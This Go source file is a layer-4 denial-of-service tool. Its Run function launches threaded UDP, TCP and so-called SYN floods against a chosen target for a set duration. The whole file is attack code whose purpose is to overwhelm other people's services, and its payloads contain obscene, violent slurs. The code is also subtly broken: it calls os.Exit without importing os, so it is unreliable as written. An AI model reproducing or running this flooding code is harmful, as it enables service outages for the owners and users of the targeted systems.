package l4

import (
	"fmt"
	"math/rand"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"
)

func Run(method, target string, threads, duration int) {
	rand.Seed(time.Now().UnixNano())

	var wg sync.WaitGroup

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			switch method {
			case "udp":
				udpFlood(target)
			case "tcp", "flood":
				tcpFlood(target)
			case "syn":
				synFlood(target)
			}
		}()
	}

	time.AfterFunc(time.Duration(duration)*time.Second, func() {
		fmt.Println("[+] L4 attack finished.")
		os.Exit(0)
	})

	wg.Wait()
}

func udpFlood(target string) {
	for {
		conn, err := net.Dial("udp", target)
		if err == nil {
			for i := 0; i < 40; i++ {
				conn.Write([]byte("fucked" + string(make([]byte, 512))))
			}
			conn.Close()
		}
		time.Sleep(2 * time.Millisecond)
	}
}

func tcpFlood(target string) {
	for {
		conn, err := net.DialTimeout("tcp", target, 3*time.Second)
		if err == nil {
			for i := 0; i < 25; i++ {
				conn.Write([]byte("GET / HTTP/1.1\r\nHost: raped\r\n\r\n"))
			}
			conn.Close()
		}
		time.Sleep(3 * time.Millisecond)
	}
}

func synFlood(target string) {
	host := target
	port := 80
	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		host = parts[0]
		port, _ = strconv.Atoi(parts[1])
	}

	for {
		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), 2*time.Second)
		if err == nil {
			conn.Close()
		}
		time.Sleep(1 * time.Millisecond)
	}
}
